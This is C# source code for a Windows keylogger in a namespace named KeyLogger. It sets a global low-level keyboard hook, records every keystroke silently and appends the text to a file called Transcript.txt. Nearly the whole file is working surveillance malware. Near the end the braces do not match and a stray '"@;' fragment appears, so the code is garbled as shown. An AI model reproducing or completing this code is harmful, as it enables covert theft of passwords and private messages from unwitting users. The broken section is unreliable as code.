using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    public static class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const string logFileName = "Transcript.txt";
        private static StreamWriter logFile;
        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;
        private static bool shiftKeyPressed = false;

        public static void Main()
        {
            logFile = File.AppendText(logFileName);
            logFile.AutoFlush = true;

            hookId = SetHook(hookProc);
            Application.Run();
            UnhookWindowsHookEx(hookId);
        }

        private static IntPtr SetHook(HookProc hookProc)
        {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (key == Keys.ShiftKey)
                {
                    shiftKeyPressed = true;
                }
                else
                {
                    char outputChar = GetCharFromKey(key);
                    logFile.Write(outputChar);
                }
            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private static char GetCharFromKey(Keys key)
        {
            char outputChar = ' ';

            if (key >= Keys.A && key <= Keys.Z)
            {
                outputChar = (char)((int)'a' + (int)key - (int)Keys.A);

                if (shiftKeyPressed)
                {
                    outputChar = Char.ToUpper(outputChar);
                    shiftKeyPressed = false;
                }
            }
            else if (key >= Keys.D0 && key <= Keys.D9)
            {
                outputChar = (char)((int)'0' + (int)key - (int)Keys.D0);
            }
            else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
            {
                outputChar = (char)((int)'0' + (int)key - (int)Keys.NumPad0);
            }
            else if (key == Keys.Space)
            {
                outputChar = ' ';
            }
            else if (key == Keys.OemPeriod)
            {
                outputChar = '.';
            }
            else if (key == Keys.Oemcomma)
            {
                outputChar = ',';
            }
            else if (key == Keys.OemQuestion)
            {
                outputChar = '?';
            }
            else if (key == Keys.OemSemicolon)
            {
                outputChar = ';';
            }
            else if (key == Keys.OemQuotes)
            {
                outputChar = '"';
            }
            else if (key == Keys.Oemtilde)
            {
                outputChar = '`';
            }
            else if (key == Keys.OemOpenBrackets)
            {
                outputChar = '[';
            }
            else if (key == Keys.OemCloseBrackets)
            {
                outputChar = ']';
            }
            else if (key == Keys.OemMinus)
            {
                outputChar = '-';
            }
            else if (key == Keys.Oemplus)
				outputChar = '+';
			} else if (key == Keys.F12) {
				logFile.Write("[F12]");
			} else if (key == Keys.Shift) {
				shiftKeyPressed = true;
			}

        return outputChar;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
}
"@;